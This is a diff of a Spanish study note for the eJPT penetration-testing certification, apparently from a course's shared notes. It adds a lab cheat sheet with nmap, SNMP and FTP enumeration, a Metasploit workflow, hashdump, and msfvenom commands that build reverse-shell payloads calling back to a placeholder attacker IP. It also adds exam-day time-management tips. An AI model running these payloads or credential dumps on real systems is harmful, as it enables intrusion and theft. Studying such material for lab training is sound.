@@ -94,22 +94,33 @@ Examen **100% práctico**: acceso a red de laboratorio real con máquinas Window
 # Reconocimiento
 nmap -sn 10.10.10.0/24
 nmap -p- -sV -oN scan.txt <IP>
+nmap --script vuln <IP>
+nmap -sU --top-ports 20 <IP> # UDP básico
 
 # Enumeración
 smbclient -L //<IP>/ -N
 enum4linux -a <IP>
 showmount -e <IP>
+snmpwalk -v2c -c public <IP> # SNMP community por defecto
+ftp <IP> # comprobar acceso anónimo
 
 # Explotación
 msfconsole
 search <servicio>
 use exploit/ruta
 set RHOSTS <IP>
+set LHOST <TU_IP>
 run
+
+# Generación de payloads
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o shell.elf
+msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
 
 # Post-explotación
 sysinfo; getuid; hashdump
 run post/multi/recon/local_exploit_suggester
+background # deja la sesión activa en segundo plano (o bg)
 
 # Web
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
@@ -139,7 +150,17 @@ sqlmap -u "http://<IP>/page.php?id=1" --dbs
 | **TryHackMe** — ruta "Jr Penetration Tester" | Progresión guiada alineada con eJPT |
 | **Hack The Box** — máquinas Easy/Medium | Especialmente las retiradas |
 | **Laboratorios INE** | Los más representativos del formato de examen |
-| **Walkthroughs del máster** | Repetir sin mirar solución |
+| **Walkthroughs del máster** | thetoppers.htb, Bacine, Granny — repetir sin mirar solución |
+
+### El día (o los días) del examen
+
+1. **Antes de empezar:** confirma que la conexión VPN al laboratorio es estable — una desconexión en post-explotación puede hacer perder progreso si no habías guardado credenciales o notas
+2. **Lee el cuestionario completo** antes de tocar el teclado: sabrás qué información ir recolectando durante escaneo y explotación
+3. **Si dura varios días:** no dejes todo para el último — primeros días para reconocimiento y explotación inicial, dejando post-explotación y preguntas complejas para el final
+4. **Si una máquina te bloquea mucho:** pasa a otra y responde primero las preguntas que sí puedas — no pierdas puntos seguros por atascarte
+
+> [!tip] GESTIÓN DEL TIEMPO
+> El examen dura varios días. La clave es **maximizar preguntas correctas**, no resolver todas las máquinas. Prioriza preguntas fáciles sobre máquinas difíciles.
 
 ### Errores frecuentes
 
@@ -180,29 +201,23 @@ sqlmap -u "http://<IP>/page.php?id=1" --dbs
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[../../apuntes evolve/BLOQUE 15.md|BLOQUE 15]] — Normativa / GRC, Pivoting / Movilidad Lateral, SQLMap
-- [[../12 - Blue Team y SOC/Blue Team - SOC e Incidentes.md|Blue Team - SOC e Incidentes]] — Metasploit, Normativa / GRC, Pivoting / Movilidad Lateral
-- [[../../apuntes Chema/Maquinas/Hack The Box- Starting Point - Tier 0.md|Hack The Box- Starting Point - Tier 0]] — Linux, Normativa / GRC, Pivoting / Movilidad Lateral
-- [[../03 - Herramientas de Analisis/Nmap - Escaneo y Enumeración.md|Nmap - Escaneo y Enumeración]] — Linux, Metasploit, Normativa / GRC
-- [[../../apuntes Joselu/PREWORK/resumen_clase16.md|resumen_clase16]] — Linux, Metasploit, Pivoting / Movilidad Lateral
-- [[../../transcripciones/Septiembre/01.09.2026 Repaso General I.md|01.09.2026 Repaso General I]] — Empleabilidad, Normativa / GRC, Pivoting / Movilidad Lateral
+- [[../../apuntes evolve/BLOQUE 15.md|BLOQUE 15]] — Hack The Box, Nmap, Windows
+- [[../03 - Herramientas de Analisis/Nmap - Escaneo y Enumeración.md|Nmap - Escaneo y Enumeración]] — Hack The Box, Metodologia Pentest, SQL Injection
+- [[../../apuntes Andres/08.09.2026 SQLi Inyecciones - Labs I.md|08.09.2026 SQLi Inyecciones - Labs I]] — Hack The Box, Metodologia Pentest, SQL Injection
+- [[../../apuntes Joselu/PREWORK/resumen_clase16.md|resumen_clase16]] — Hack The Box, Metodologia Pentest, SQL Injection
+- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Hack The Box, Metodologia Pentest, SQL Injection
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Google_Dorks|Google Dorks]]
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Nmap|Nmap]]
-- [[comandos/SQLMap|SQLMap]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Ciberseguridad/wordpress_security.md|wordpress_security]] — Programacion: Desarrollo Web, Linux, Testing
+- [[../../../programacion/NestJS/patrones_nestjs.md|patrones_nestjs]] — Programacion: Desarrollo Web, Linux, Testing
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
-
-> #blue-team #certificaciones #empleabilidad #google-dorks #hack-the-box #linux #metasploit #nmap #normativa #osint #pentest #pivoting #redes #sqli #sqlmap #ssh #windows
+> #certificaciones #crypto #empleabilidad #google_dorks #hack_the_box #linux #linux_ciber #metasploit #nmap #normativa #osint #pentest #pivoting #redes #redes_ciber #sql #sqli #sqlmap_tool #ssh_tool #testing #web #windows_ciber
